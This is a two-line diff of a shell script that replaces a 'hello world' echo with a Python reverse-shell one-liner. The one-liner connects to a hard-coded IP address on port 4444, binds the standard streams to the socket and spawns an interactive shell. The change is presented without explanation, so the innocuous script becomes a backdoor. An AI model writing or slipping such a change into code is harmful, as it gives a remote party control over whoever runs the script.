@@ -1,2 +1,2 @@
 #!/bin/sh
-echo "hello world"
+export RHOST="98.71.19.121";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
